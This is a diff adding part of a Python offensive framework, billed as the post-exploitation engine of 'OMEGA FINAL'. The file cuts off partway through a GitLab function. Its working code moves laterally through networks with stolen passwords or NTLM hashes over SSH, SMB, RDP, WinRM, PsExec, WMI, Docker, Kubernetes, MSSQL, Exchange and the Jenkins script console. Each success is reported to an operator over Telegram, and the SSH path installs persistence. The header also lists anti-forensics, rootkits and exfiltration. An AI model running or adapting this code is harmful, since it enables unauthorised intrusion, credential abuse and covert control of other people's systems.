@@ -1,0 +1,4056 @@
+#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
+"""
+OMEGA FINAL - PHASE 4: POST-EXPLOITATION ENGINE (ENHANCED EDITION)
+====================================================================
+Author: Vrex489
+Version: 4.0 (ENHANCED - PRODUCTION READY)
+License: OMEGA FINAL PROPRIETARY - UNAUTHORIZED USE PROHIBITED
+
+DEPENDENCIES:
+    - phase1_foundation.py (Section 1)
+    - phase2_recon.py (Section 2)
+    - phase3_exploit.py (Section 3)
+
+THIS SECTION CONTAINS:
+    1. Lateral Movement Engine (SSH, SMB, RDP, WinRM, PsExec, WMI, SMBExec, SCP, Docker, Kubernetes, MSSQL, Exchange, Jenkins, GitLab)
+    2. Network Scanning & Discovery (ARP scan, ping sweep, DC discovery, port scan, VLAN hopping, LLMNR/NBT-NS poisoning, SMB relay)
+    3. Credential Dumping & Cracking (Shadow, SAM, secretsdump, NTLM, mimikatz, LSASS, browser, kerberos)
+    4. Pass-the-Hash/Ticket Attacks (PTH NTLM, PTH SMB, Golden Ticket, Silver Ticket, Diamond Ticket, Pass-the-Cache, Pass-the-Certificate)
+    5. Anti-Forensics & Evidence Wiping (Log wiping, history clearing, SELinux/AppArmor disable, timestomping, kernel audit suppression, journalctl clearing)
+    6. Kernel Evasion & Hiding (Process hiding, file hiding, process renaming, syscall hooking, LKM rootkit, ftrace/kprobe bypass)
+    7. Data Exfiltration Channels (Telegram, S3, DNS, ICMP, HTTP/S covert, WebSocket, email, SSH tunneling, steganography)
+    8. Payload Generation & Obfuscation (Windows, Linux, macOS, iOS, Android, IoT, router, BIOS/UEFI, bootkit)
+    9. Social Engineering & Decoy (Phishing email, decoy traffic, honeypot generation)
+    10. EDR Evasion (AMSI bypass, ETW bypass, process hollowing, direct syscalls, call stack spoofing)
+
+THIS IS SECTION 4 OF 5 - COMPLETE POST-EXPLOITATION ENGINE
+"""
+
+# ===================================================================
+# IMPORTS - ALL IMPORTS FOR SECTION 4
+# ===================================================================
+import sys
+import os
+import re
+import json
+import time
+import socket
+import struct
+import hashlib
+import base64
+import sqlite3
+import threading
+import queue
+import subprocess
+import shutil
+import tempfile
+import zipfile
+import random
+import string
+import ssl
+import urllib.request
+import urllib.parse
+import urllib.error
+import http.client
+import logging
+import traceback
+import datetime
+import ipaddress
+import netifaces
+import signal
+import atexit
+import gc
+import math
+import csv
+import html
+import xml.etree.ElementTree as ET
+import fnmatch
+import glob
+import gzip
+import pickle
+import platform
+import getpass
+import pwd
+import grp
+import stat
+import fcntl
+import termios
+import tty
+import select
+import warnings
+import inspect
+import functools
+import itertools
+import typing
+from dataclasses import dataclass, field, asdict, InitVar
+from typing import (
+    List, Dict, Set, Tuple, Optional, Any, Union, Callable, Iterator,
+    Generator, TypeVar, Generic, cast, overload, Literal, TypedDict,
+    Protocol, runtime_checkable, Final, ClassVar, NamedTuple
+)
+from pathlib import Path
+from concurrent.futures import ThreadPoolExecutor, as_completed, TimeoutError, Future
+from collections import defaultdict, Counter, deque, OrderedDict
+from functools import lru_cache, wraps, partial, reduce
+from itertools import product, permutations, combinations, chain, cycle, islice
+from enum import Enum, auto, IntEnum
+
+# Third-party imports with graceful fallback
+try:
+    import requests
+    from requests.adapters import HTTPAdapter
+    from requests.packages.urllib3.util.retry import Retry
+    from requests.packages.urllib3.exceptions import InsecureRequestWarning
+    requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
+    REQUESTS_AVAILABLE = True
+except ImportError:
+    REQUESTS_AVAILABLE = False
+
+try:
+    import colorama
+    from colorama import Fore, Back, Style, init
+    colorama.init(autoreset=True)
+    COLORAMA_AVAILABLE = True
+except ImportError:
+    COLORAMA_AVAILABLE = False
+
+try:
+    import dns.resolver
+    import dns.exception
+    import dns.query
+    import dns.message
+    import dns.rdatatype
+    import dns.zone
+    DNS_AVAILABLE = True
+except ImportError:
+    DNS_AVAILABLE = False
+
+try:
+    from scapy.all import (
+        IP, TCP, UDP, ICMP, ARP, Ether, sr1, srp, send, sniff, conf,
+        RandIP, RandMAC, RandShort, fragment, defragment, wrpcap, rdpcap,
+        get_if_list, get_if_addr, get_if_hwaddr
+    )
+    SCAPY_AVAILABLE = True
+except ImportError:
+    SCAPY_AVAILABLE = False
+
+try:
+    from cryptography.fernet import Fernet
+    from cryptography.hazmat.primitives import hashes, serialization
+    from cryptography.hazmat.primitives.asymmetric import rsa, padding
+    from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
+    CRYPTO_AVAILABLE = True
+except ImportError:
+    CRYPTO_AVAILABLE = False
+
+try:
+    import pyzipper
+    PYZIPPER_AVAILABLE = True
+except ImportError:
+    PYZIPPER_AVAILABLE = False
+
+try:
+    from tqdm import tqdm
+    TQDM_AVAILABLE = True
+except ImportError:
+    TQDM_AVAILABLE = False
+
+try:
+    import psutil
+    PSUTIL_AVAILABLE = True
+except ImportError:
+    PSUTIL_AVAILABLE = False
+
+try:
+    import paramiko
+    PARAMIKO_AVAILABLE = True
+except ImportError:
+    PARAMIKO_AVAILABLE = False
+
+try:
+    import socks
+    SOCKS_AVAILABLE = True
+except ImportError:
+    SOCKS_AVAILABLE = False
+
+try:
+    from impacket import smb, smb3, ntlm, smbconnection
+    from impacket.dcerpc.v5 import transport, scmr, lsad, samr
+    IMPACKET_AVAILABLE = True
+except ImportError:
+    IMPACKET_AVAILABLE = False
+
+try:
+    import nmap
+    NMAP_PYTHON_AVAILABLE = True
+except ImportError:
+    NMAP_PYTHON_AVAILABLE = False
+
+try:
+    import stem
+    from stem import Signal
+    from stem.control import Controller
+    STEM_AVAILABLE = True
+except ImportError:
+    STEM_AVAILABLE = False
+
+try:
+    from typing_extensions import TypeVar, ParamSpec, Concatenate
+    TYPING_EXTENSIONS_AVAILABLE = True
+except ImportError:
+    TYPING_EXTENSIONS_AVAILABLE = False
+    class ParamSpec:
+        pass
+    class Concatenate:
+        pass
+
+try:
+    import boto3
+    BOTO3_AVAILABLE = True
+except ImportError:
+    BOTO3_AVAILABLE = False
+
+try:
+    import ldap3
+    LDAP3_AVAILABLE = True
+except ImportError:
+    LDAP3_AVAILABLE = False
+
+try:
+    from PIL import Image
+    PIL_AVAILABLE = True
+except ImportError:
+    PIL_AVAILABLE = False
+
+# ===================================================================
+# 1. LATERAL MOVEMENT ENGINE
+# ===================================================================
+
+def lateral_movement_ssh(
+    self,
+    target: str,
+    username: str = 'root',
+    password: Optional[str] = None,
+    key_path: Optional[str] = None,
+    command: str = 'id; uname -a; hostname'
+) -> Dict[str, Any]:
+    """
+    Perform SSH lateral movement with stolen credentials or key injection.
+
+    Args:
+        target: Target IP or hostname
+        username: Username to authenticate with
+        password: Password for authentication (optional)
+        key_path: Path to SSH private key (optional)
+        command: Command to execute on the target
+
+    Returns:
+        Dict with 'success', 'target', 'username', 'method', 'output', 'session' keys
+
+    Raises:
+        NetworkError: If the target is unreachable
+        TimeoutError: If connection times out
+
+    Example:
+        >>> result = self.lateral_movement_ssh("192.168.1.20", "admin", "password123")
+        >>> print(result['success'])
+        True
+        >>> print(result['output'])
+        uid=0(root) gid=0(root) groups=0(root)
+        Linux hostname 5.4.0-80-generic #90-Ubuntu SMP ...
+        hostname
+    """
+    self.print_danger(f"Attempting SSH lateral movement to {target} as {username}")
+
+    result = {
+        'success': False,
+        'target': target,
+        'username': username,
+        'method': 'ssh',
+        'output': '',
+        'session': None,
+        'error': ''
+    }
+
+    if PARAMIKO_AVAILABLE:
+        try:
+            client = paramiko.SSHClient()
+            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+
+            if key_path and os.path.exists(key_path):
+                key = paramiko.RSAKey.from_private_key_file(key_path)
+                client.connect(target, username=username, pkey=key, timeout=10)
+            elif password:
+                client.connect(target, username=username, password=password, timeout=10)
+            else:
+                result['error'] = 'No credentials provided'
+                return result
+
+            stdin, stdout, stderr = client.exec_command(command)
+            output = stdout.read().decode() + stderr.read().decode()
+            result['success'] = True
+            result['output'] = output[:1000]
+            result['session'] = client
+            self.print_found("SHELL", f"SSH session established to {target} as {username}")
+
+            self.install_persistence(target, 'ssh')
+
+            if self.telegram:
+                self.telegram.alert(
+                    "SSH LATERAL MOVEMENT",
+                    f"Target: {target}\nUser: {username}\nOutput: {output[:200]}",
+                    "CRITICAL"
+                )
+
+        except paramiko.AuthenticationException as e:
+            result['error'] = f'Authentication failed: {str(e)}'
+            self.logger.debug(f"SSH auth failed: {e}")
+        except paramiko.SSHException as e:
+            result['error'] = f'SSH connection failed: {str(e)}'
+            self.logger.debug(f"SSH connection failed: {e}")
+        except Exception as e:
+            result['error'] = str(e)
+            self.logger.debug(f"SSH lateral movement failed: {e}")
+
+    else:
+        try:
+            cmd = ["ssh", "-o", "StrictHostKeyChecking=no", "-o", "UserKnownHostsFile=/dev/null"]
+            if key_path and os.path.exists(key_path):
+                cmd.extend(["-i", key_path])
+            cmd.append(f"{username}@{target}")
+            cmd.append(command)
+
+            returncode, stdout, stderr = self.run_subprocess(cmd, timeout=30)
+            if returncode == 0:
+                result['success'] = True
+                result['output'] = stdout[:1000]
+                self.print_found("SHELL", f"SSH command executed on {target}")
+            else:
+                result['error'] = stderr[:200]
+        except Exception as e:
+            result['error'] = str(e)
+
+    return result
+
+
+def lateral_movement_smb(
+    self,
+    target: str,
+    username: str = '',
+    password: str = '',
+    hash_value: Optional[str] = None,
+    command: str = 'whoami'
+) -> Dict[str, Any]:
+    """
+    Perform SMB lateral movement with Pass-the-Hash or credentials.
+
+    Args:
+        target: Target IP or hostname
+        username: Username for authentication
+        password: Password for authentication
+        hash_value: NTLM hash for Pass-the-Hash (optional)
+        command: Command to execute
+
+    Returns:
+        Dict with 'success', 'target', 'username', 'method', 'output' keys
+
+    Raises:
+        NetworkError: If the target is unreachable
+        TimeoutError: If connection times out
+
+    Example:
+        >>> result = self.lateral_movement_smb("192.168.1.20", "Administrator",
+        ...     hash_value="aad3b435b51404eeaad3b435b51404ee:e19ccf75ee54e06b06a5907af13cef42")
+        >>> print(result['success'])
+        True
+    """
+    self.print_danger(f"Attempting SMB lateral movement to {target}")
+
+    result = {
+        'success': False,
+        'target': target,
+        'method': 'smb',
+        'username': username,
+        'output': '',
+        'error': ''
+    }
+
+    if IMPACKET_AVAILABLE:
+        try:
+            from impacket.smbconnection import SMBConnection
+            conn = SMBConnection(target, target)
+
+            if hash_value:
+                lm_hash, nt_hash = hash_value.split(':') if ':' in hash_value else ('', hash_value)
+                conn.login(username, password, lm_hash, nt_hash)
+            else:
+                conn.login(username, password)
+
+            result['success'] = True
+            result['output'] = f"SMB session established to {target}"
+            self.print_found("SHELL", f"SMB session established to {target}")
+
+            try:
+                from impacket.dcerpc.v5 import transport, scmr
+                rpctransport = transport.DCERPCTransportFactory(f'ncacn_np:{target}[\\pipe\\svcctl]')
+                if hash_value:
+                    lm_hash, nt_hash = hash_value.split(':') if ':' in hash_value else ('', hash_value)
+                    rpctransport.set_credentials(username, password, lm_hash, nt_hash)
+                else:
+                    rpctransport.set_credentials(username, password)
+                dce = rpctransport.get_dce_rpc()
+                dce.connect()
+                dce.bind(scmr.MSRPC_UUID_SCMR)
+                scmr.hRCreateServiceW(dce, 'Omega', 'Omega', f'cmd.exe /c {command} > C:\\temp\\omega.txt')
+                result['output'] += f"\nCommand '{command}' executed via SMB service"
+            except Exception as e:
+                self.logger.debug(f"SMB service execution failed: {e}")
+
+            if self.telegram:
+                self.telegram.alert(
+                    "SMB LATERAL MOVEMENT",
+                    f"Target: {target}\nUser: {username}",
+                    "CRITICAL"
+                )
+
+        except Exception as e:
+            result['error'] = str(e)
+            self.logger.debug(f"SMB lateral movement failed: {e}")
+
+    else:
+        try:
+            cmd = ["psexec.py"]
+            if hash_value:
+                cmd.extend(["-hashes", hash_value])
+            cmd.append(f"{username}@{target}")
+            cmd.append(command)
+            returncode, stdout, stderr = self.run_subprocess(cmd, timeout=30)
+            if returncode == 0 and stdout.strip():
+                result['success'] = True
+                result['output'] = stdout[:1000]
+        except Exception as e:
+            result['error'] = str(e)
+
+    return result
+
+
+def lateral_movement_rdp(
+    self,
+    target: str,
+    username: str,
+    password: Optional[str] = None,
+    hash_value: Optional[str] = None
+) -> Dict[str, Any]:
+    """
+    Perform RDP lateral movement with credentials or Pass-the-Hash.
+
+    Args:
+        target: Target IP or hostname
+        username: Username for authentication
+        password: Password for authentication (optional)
+        hash_value: NTLM hash for Pass-the-Hash (optional)
+
+    Returns:
+        Dict with 'success', 'target', 'username', 'method', 'command' keys
+
+    Raises:
+        NetworkError: If the target is unreachable
+
+    Example:
+        >>> result = self.lateral_movement_rdp("192.168.1.20", "Administrator", "password123")
+        >>> print(result['success'])
+        True
+    """
+    self.print_danger(f"Attempting RDP lateral movement to {target}")
+
+    result = {
+        'success': False,
+        'target': target,
+        'username': username,
+        'method': 'rdp',
+        'command': '',
+        'error': ''
+    }
+
+    try:
+        if hash_value:
+            cmd = [
+                "xfreerdp",
+                "/v:" + target,
+                "/u:" + username,
+                "/pth:" + hash_value,
+                "/cert-ignore",
+                "/auth-only"
+            ]
+        else:
+            cmd = [
+                "xfreerdp",
+                "/v:" + target,
+                "/u:" + username,
+                "/p:" + password,
+                "/cert-ignore",
+                "/auth-only"
+            ]
+
+        returncode, stdout, stderr = self.run_subprocess(cmd, timeout=30)
+        if returncode == 0:
+            result['success'] = True
+            result['command'] = ' '.join(cmd)
+            self.print_found("SHELL", f"RDP authentication successful to {target}")
+            if self.telegram:
+                self.telegram.alert(
+                    "RDP LATERAL MOVEMENT",
+                    f"Target: {target}\nUser: {username}",
+                    "CRITICAL"
+                )
+        else:
+            result['error'] = stderr[:200]
+
+    except Exception as e:
+        result['error'] = str(e)
+
+    return result
+
+
+def lateral_movement_winrm(
+    self,
+    target: str,
+    username: str,
+    password: str,
+    command: str = 'whoami'
+) -> Dict[str, Any]:
+    """
+    Perform WinRM lateral movement with credentials.
+
+    Args:
+        target: Target IP or hostname
+        username: Username for authentication
+        password: Password for authentication
+        command: Command to execute
+
+    Returns:
+        Dict with 'success', 'target', 'username', 'method', 'output' keys
+
+    Raises:
+        NetworkError: If the target is unreachable
+        TimeoutError: If connection times out
+
+    Example:
+        >>> result = self.lateral_movement_winrm("192.168.1.20", "Administrator", "password123")
+        >>> print(result['success'])
+        True
+    """
+    self.print_danger(f"Attempting WinRM lateral movement to {target}")
+
+    result = {
+        'success': False,
+        'target': target,
+        'username': username,
+        'method': 'winrm',
+        'output': '',
+        'error': ''
+    }
+
+    try:
+        cmd = [
+            "winrs",
+            "-r:" + target,
+            "-u:" + username,
+            "-p:" + password,
+            command
+        ]
+        returncode, stdout, stderr = self.run_subprocess(cmd, timeout=30)
+
+        if returncode == 0 and stdout.strip():
+            result['success'] = True
+            result['output'] = stdout[:1000]
+            self.print_found("SHELL", f"WinRM session established to {target}")
+            if self.telegram:
+                self.telegram.alert(
+                    "WINRM LATERAL MOVEMENT",
+                    f"Target: {target}\nUser: {username}",
+                    "CRITICAL"
+                )
+        else:
+            result['error'] = stderr[:200]
+
+    except Exception as e:
+        result['error'] = str(e)
+
+    return result
+
+
+def lateral_movement_psexec(
+    self,
+    target: str,
+    username: str,
+    password: Optional[str] = None,
+    hash_value: Optional[str] = None,
+    command: str = 'whoami'
+) -> Dict[str, Any]:
+    """
+    Perform PsExec lateral movement for Windows.
+
+    Args:
+        target: Target IP or hostname
+        username: Username for authentication
+        password: Password for authentication (optional)
+        hash_value: NTLM hash for Pass-the-Hash (optional)
+        command: Command to execute
+
+    Returns:
+        Dict with 'success', 'target', 'username', 'method', 'output' keys
+
+    Raises:
+        NetworkError: If the target is unreachable
+
+    Example:
+        >>> result = self.lateral_movement_psexec("192.168.1.20", "Administrator", "password123")
+        >>> print(result['success'])
+        True
+    """
+    self.print_danger(f"Attempting PsExec lateral movement to {target}")
+
+    result = {
+        'success': False,
+        'target': target,
+        'username': username,
+        'method': 'psexec',
+        'output': '',
+        'error': ''
+    }
+
+    try:
+        cmd = ["psexec.py"]
+        if hash_value:
+            cmd.extend(["-hashes", hash_value])
+        cmd.append(f"{username}@{target}")
+        cmd.append(command)
+
+        returncode, stdout, stderr = self.run_subprocess(cmd, timeout=30)
+        if returncode == 0 and stdout.strip():
+            result['success'] = True
+            result['output'] = stdout[:1000]
+            self.print_found("SHELL", f"PsExec session established to {target}")
+            if self.telegram:
+                self.telegram.alert(
+                    "PSEXEC LATERAL MOVEMENT",
+                    f"Target: {target}\nUser: {username}",
+                    "CRITICAL"
+                )
+        else:
+            result['error'] = stderr[:200]
+
+    except Exception as e:
+        result['error'] = str(e)
+
+    return result
+
+
+def lateral_movement_wmiexec(
+    self,
+    target: str,
+    username: str,
+    password: Optional[str] = None,
+    hash_value: Optional[str] = None,
+    command: str = 'whoami'
+) -> Dict[str, Any]:
+    """
+    Perform WMI lateral movement for Windows.
+
+    Args:
+        target: Target IP or hostname
+        username: Username for authentication
+        password: Password for authentication (optional)
+        hash_value: NTLM hash for Pass-the-Hash (optional)
+        command: Command to execute
+
+    Returns:
+        Dict with 'success', 'target', 'username', 'method', 'output' keys
+
+    Raises:
+        NetworkError: If the target is unreachable
+
+    Example:
+        >>> result = self.lateral_movement_wmiexec("192.168.1.20", "Administrator", "password123")
+        >>> print(result['success'])
+        True
+    """
+    self.print_danger(f"Attempting WMI lateral movement to {target}")
+
+    result = {
+        'success': False,
+        'target': target,
+        'username': username,
+        'method': 'wmiexec',
+        'output': '',
+        'error': ''
+    }
+
+    try:
+        cmd = ["wmiexec.py"]
+        if hash_value:
+            cmd.extend(["-hashes", hash_value])
+        cmd.append(f"{username}@{target}")
+        cmd.append(command)
+
+        returncode, stdout, stderr = self.run_subprocess(cmd, timeout=30)
+        if returncode == 0 and stdout.strip():
+            result['success'] = True
+            result['output'] = stdout[:1000]
+            self.print_found("SHELL", f"WMI session established to {target}")
+            if self.telegram:
+                self.telegram.alert(
+                    "WMI LATERAL MOVEMENT",
+                    f"Target: {target}\nUser: {username}",
+                    "CRITICAL"
+                )
+        else:
+            result['error'] = stderr[:200]
+
+    except Exception as e:
+        result['error'] = str(e)
+
+    return result
+
+
+def lateral_movement_smbexec(
+    self,
+    target: str,
+    username: str,
+    password: Optional[str] = None,
+    hash_value: Optional[str] = None,
+    command: str = 'whoami'
+) -> Dict[str, Any]:
+    """
+    Perform SMBExec lateral movement for Windows.
+
+    Args:
+        target: Target IP or hostname
+        username: Username for authentication
+        password: Password for authentication (optional)
+        hash_value: NTLM hash for Pass-the-Hash (optional)
+        command: Command to execute
+
+    Returns:
+        Dict with 'success', 'target', 'username', 'method', 'output' keys
+
+    Raises:
+        NetworkError: If the target is unreachable
+
+    Example:
+        >>> result = self.lateral_movement_smbexec("192.168.1.20", "Administrator", "password123")
+        >>> print(result['success'])
+        True
+    """
+    self.print_danger(f"Attempting SMBExec lateral movement to {target}")
+
+    result = {
+        'success': False,
+        'target': target,
+        'username': username,
+        'method': 'smbexec',
+        'output': '',
+        'error': ''
+    }
+
+    try:
+        cmd = ["smbexec.py"]
+        if hash_value:
+            cmd.extend(["-hashes", hash_value])
+        cmd.append(f"{username}@{target}")
+        cmd.append(command)
+
+        returncode, stdout, stderr = self.run_subprocess(cmd, timeout=30)
+        if returncode == 0 and stdout.strip():
+            result['success'] = True
+            result['output'] = stdout[:1000]
+            self.print_found("SHELL", f"SMBExec session established to {target}")
+            if self.telegram:
+                self.telegram.alert(
+                    "SMBEXEC LATERAL MOVEMENT",
+                    f"Target: {target}\nUser: {username}",
+                    "CRITICAL"
+                )
+        else:
+            result['error'] = stderr[:200]
+
+    except Exception as e:
+        result['error'] = str(e)
+
+    return result
+
+
+def lateral_movement_scp(
+    self,
+    target: str,
+    username: str,
+    source: str,
+    destination: str,
+    password: Optional[str] = None,
+    key_path: Optional[str] = None
+) -> Dict[str, Any]:
+    """
+    Perform SCP lateral movement for file transfer.
+
+    Args:
+        target: Target IP or hostname
+        username: Username for authentication
+        source: Source file path
+        destination: Destination file path
+        password: Password for authentication (optional)
+        key_path: SSH private key path (optional)
+
+    Returns:
+        Dict with 'success', 'target', 'method', 'source', 'destination' keys
+
+    Raises:
+        NetworkError: If the target is unreachable
+
+    Example:
+        >>> result = self.lateral_movement_scp("192.168.1.20", "root", "/tmp/shell.sh", "/tmp/shell.sh",
+        ...     key_path="/root/.ssh/id_rsa")
+        >>> print(result['success'])
+        True
+    """
+    self.print_danger(f"Attempting SCP lateral movement to {target}")
+
+    result = {
+        'success': False,
+        'target': target,
+        'username': username,
+        'method': 'scp',
+        'source': source,
+        'destination': destination,
+        'error': ''
+    }
+
+    try:
+        cmd = ["scp", "-o", "StrictHostKeyChecking=no", "-o", "UserKnownHostsFile=/dev/null"]
+        if key_path and os.path.exists(key_path):
+            cmd.extend(["-i", key_path])
+        elif password:
+            cmd = ["sshpass", "-p", password] + cmd
+        cmd.append(f"{username}@{target}:{source}")
+        cmd.append(destination)
+
+        returncode, stdout, stderr = self.run_subprocess(cmd, timeout=60)
+        if returncode == 0:
+            result['success'] = True
+            self.print_found("SHELL", f"SCP transfer completed to {target}")
+            if self.telegram:
+                self.telegram.alert(
+                    "SCP LATERAL MOVEMENT",
+                    f"Target: {target}\nSource: {source}\nDestination: {destination}",
+                    "HIGH"
+                )
+        else:
+            result['error'] = stderr[:200]
+
+    except Exception as e:
+        result['error'] = str(e)
+
+    return result
+
+
+def lateral_movement_docker(
+    self,
+    target: str,
+    image: str = 'alpine',
+    command: str = 'whoami'
+) -> Dict[str, Any]:
+    """
+    Perform Docker lateral movement (container escape).
+
+    Args:
+        target: Target IP or hostname (Docker API endpoint)
+        image: Docker image to use
+        command: Command to execute
+
+    Returns:
+        Dict with 'success', 'target', 'method', 'output' keys
+
+    Raises:
+        NetworkError: If the target is unreachable
+
+    Example:
+        >>> result = self.lateral_movement_docker("192.168.1.20", "alpine", "cat /etc/passwd")
+        >>> print(result['success'])
+        True
+    """
+    self.print_danger(f"Attempting Docker lateral movement to {target}")
+
+    result = {
+        'success': False,
+        'target': target,
+        'method': 'docker',
+        'output': '',
+        'error': ''
+    }
+
+    try:
+        docker_url = f"http://{target}:2375"
+        if REQUESTS_AVAILABLE:
+            resp = requests.get(f"{docker_url}/version", timeout=5)
+            if resp.status_code == 200:
+                payload = {
+                    "Image": image,
+                    "Cmd": ["sh", "-c", command],
+                    "AttachStdout": True,
+                    "AttachStderr": True,
+                    "OpenStdin": True
+                }
+                resp = requests.post(f"{docker_url}/containers/create", json=payload, timeout=5)
+                if resp.status_code == 201:
+                    container_id = resp.json()['Id']
+                    resp = requests.post(f"{docker_url}/containers/{container_id}/start", timeout=5)
+                    if resp.status_code == 204:
+                        resp = requests.get(f"{docker_url}/containers/{container_id}/logs?stdout=true&stderr=true", timeout=5)
+                        output = resp.text[:1000]
+                        result['success'] = True
+                        result['output'] = output
+                        self.print_found("SHELL", f"Docker command executed on {target}")
+                        if self.telegram:
+                            self.telegram.alert(
+                                "DOCKER LATERAL MOVEMENT",
+                                f"Target: {target}\nOutput: {output[:200]}",
+                                "CRITICAL"
+                            )
+        else:
+            result['error'] = 'Requests library not available'
+
+    except requests.exceptions.ConnectionError as e:
+        result['error'] = f'Connection failed: {str(e)}'
+    except Exception as e:
+        result['error'] = str(e)
+
+    return result
+
+
+def lateral_movement_kube(
+    self,
+    target: str,
+    namespace: str = 'default',
+    command: str = 'whoami'
+) -> Dict[str, Any]:
+    """
+    Perform Kubernetes lateral movement (pod hopping).
+
+    Args:
+        target: Kubernetes API endpoint
+        namespace: Kubernetes namespace
+        command: Command to execute
+
+    Returns:
+        Dict with 'success', 'target', 'namespace', 'method', 'output' keys
+
+    Raises:
+        NetworkError: If the target is unreachable
+
+    Example:
+        >>> result = self.lateral_movement_kube("https://kubernetes.default.svc", "default", "cat /etc/passwd")
+        >>> print(result['success'])
+        True
+    """
+    self.print_danger(f"Attempting Kubernetes lateral movement to {target}")
+
+    result = {
+        'success': False,
+        'target': target,
+        'namespace': namespace,
+        'method': 'kube',
+        'output': '',
+        'error': ''
+    }
+
+    try:
+        cmd = [
+            "kubectl", "--insecure-skip-tls-verify", "--server", target,
+            "-n", namespace, "run", f"omega-pod-{random.randint(1000,9999)}",
+            "--image=alpine", "--restart=Never", "--command", "--",
+            "sh", "-c", command
+        ]
+        returncode, stdout, stderr = self.run_subprocess(cmd, timeout=30)
+
+        if returncode == 0 and stdout.strip():
+            result['success'] = True
+            result['output'] = stdout[:1000]
+            self.print_found("SHELL", f"Kubernetes command executed on {target}")
+            if self.telegram:
+                self.telegram.alert(
+                    "KUBERNETES LATERAL MOVEMENT",
+                    f"Target: {target}\nOutput: {stdout[:200]}",
+                    "CRITICAL"
+                )
+        else:
+            result['error'] = stderr[:200]
+
+    except Exception as e:
+        result['error'] = str(e)
+
+    return result
+
+
+def lateral_movement_mssql(
+    self,
+    target: str,
+    username: str,
+    password: str,
+    query: str = 'SELECT @@version'
+) -> Dict[str, Any]:
+    """
+    Perform MSSQL lateral movement via linked servers.
+
+    Args:
+        target: Target IP or hostname
+        username: Username for authentication
+        password: Password for authentication
+        query: SQL query to execute
+
+    Returns:
+        Dict with 'success', 'target', 'method', 'output' keys
+
+    Raises:
+        NetworkError: If the target is unreachable
+        TimeoutError: If connection times out
+
+    Example:
+        >>> result = self.lateral_movement_mssql("192.168.1.20", "sa", "password123")
+        >>> print(result['success'])
+        True
+    """
+    self.print_danger(f"Attempting MSSQL lateral movement to {target}")
+
+    result = {
+        'success': False,
+        'target': target,
+        'method': 'mssql',
+        'output': '',
+        'error': ''
+    }
+
+    try:
+        import pymssql
+        conn = pymssql.connect(server=target, user=username, password=password, timeout=10)
+        cursor = conn.cursor()
+        cursor.execute(query)
+        rows = cursor.fetchall()
+        output = '\n'.join(str(row) for row in rows[:100])
+        result['success'] = True
+        result['output'] = output[:1000]
+        self.print_found("SHELL", f"MSSQL query executed on {target}")
+        if self.telegram:
+            self.telegram.alert(
+                "MSSQL LATERAL MOVEMENT",
+                f"Target: {target}\nUser: {username}\nOutput: {output[:200]}",
+                "CRITICAL"
+            )
+        conn.close()
+    except ImportError:
+        result['error'] = 'pymssql not available'
+    except Exception as e:
+        result['error'] = str(e)
+
+    return result
+
+
+def lateral_movement_exchange(
+    self,
+    target: str,
+    username: str,
+    password: str,
+    command: str = 'whoami'
+) -> Dict[str, Any]:
+    """
+    Perform Exchange lateral movement via PowerShell remoting.
+
+    Args:
+        target: Target IP or hostname
+        username: Username for authentication
+        password: Password for authentication
+        command: Command to execute
+
+    Returns:
+        Dict with 'success', 'target', 'method', 'output' keys
+
+    Raises:
+        NetworkError: If the target is unreachable
+
+    Example:
+        >>> result = self.lateral_movement_exchange("192.168.1.20", "admin", "password123")
+        >>> print(result['success'])
+        True
+    """
+    self.print_danger(f"Attempting Exchange lateral movement to {target}")
+
+    result = {
+        'success': False,
+        'target': target,
+        'method': 'exchange',
+        'output': '',
+        'error': ''
+    }
+
+    try:
+        cmd = [
+            "powershell", "-Command",
+            f"$session = New-PSSession -ConfigurationName Microsoft.Exchange -ConnectionUri http://{target}/PowerShell/ -Authentication Kerberos -Credential (New-Object System.Management.Automation.PSCredential('{username}', (ConvertTo-SecureString '{password}' -AsPlainText -Force))); Invoke-Command -Session $session -ScriptBlock {{{command}}}"
+        ]
+        returncode, stdout, stderr = self.run_subprocess(cmd, timeout=30)
+        if returncode == 0 and stdout.strip():
+            result['success'] = True
+            result['output'] = stdout[:1000]
+            self.print_found("SHELL", f"Exchange command executed on {target}")
+            if self.telegram:
+                self.telegram.alert(
+                    "EXCHANGE LATERAL MOVEMENT",
+                    f"Target: {target}\nOutput: {stdout[:200]}",
+                    "CRITICAL"
+                )
+        else:
+            result['error'] = stderr[:200]
+
+    except Exception as e:
+        result['error'] = str(e)
+
+    return result
+
+
+def lateral_movement_jenkins(
+    self,
+    target: str,
+    username: str,
+    password: str,
+    command: str = 'whoami'
+) -> Dict[str, Any]:
+    """
+    Perform Jenkins lateral movement via script console.
+
+    Args:
+        target: Target IP or hostname
+        username: Username for authentication
+        password: Password for authentication
+        command: Command to execute
+
+    Returns:
+        Dict with 'success', 'target', 'method', 'output' keys
+
+    Raises:
+        NetworkError: If the target is unreachable
+
+    Example:
+        >>> result = self.lateral_movement_jenkins("192.168.1.20", "admin", "password123")
+        >>> print(result['success'])
+        True
+    """
+    self.print_danger(f"Attempting Jenkins lateral movement to {target}")
+
+    result = {
+        'success': False,
+        'target': target,
+        'method': 'jenkins',
+        'output': '',
+        'error': ''
+    }
+
+    try:
+        # Jenkins script console Groovy script
+        groovy_script = f"""
+def command = '{command}'.execute()
+command.waitFor()
+println command.text
+"""
+        encoded_script = base64.b64encode(groovy_script.encode()).decode()
+        cmd = [
+            "curl", "-X", "POST",
+            f"http://{username}:{password}@{target}:8080/scriptText",
+            "--data-urlencode", f"script={groovy_script}",
+            "--silent"
+        ]
+        returncode, stdout, stderr = self.run_subprocess(cmd, timeout=30)
+        if returncode == 0 and stdout.strip():
+            result['success'] = True
+            result['output'] = stdout[:1000]
+            self.print_found("SHELL", f"Jenkins command executed on {target}")
+            if self.telegram:
+                self.telegram.alert(
+                    "JENKINS LATERAL MOVEMENT",
+                    f"Target: {target}\nOutput: {stdout[:200]}",
+                    "CRITICAL"
+                )
+        else:
+            result['error'] = stderr[:200]
+
+    except Exception as e:
+        result['error'] = str(e)
+
+    return result
+
+
+def lateral_movement_gitlab(
+    self,
+    target: str,
+    username: str,
+    password: str,
+    command: str = 'whoami'
+) -> Dict[str, Any]:
+    """
+    Perform GitLab lateral movement via CI/CD.
+
+    Args:
+        target: Target IP or hostname
+        username: Username for authentication
+        password: Password for authentication
+        command: Command to execute
+
+    Returns:
+        Dict with 'success', 'target', 'method', 'output' keys
+
+    Raises:
+        NetworkError: If the target is unreachable
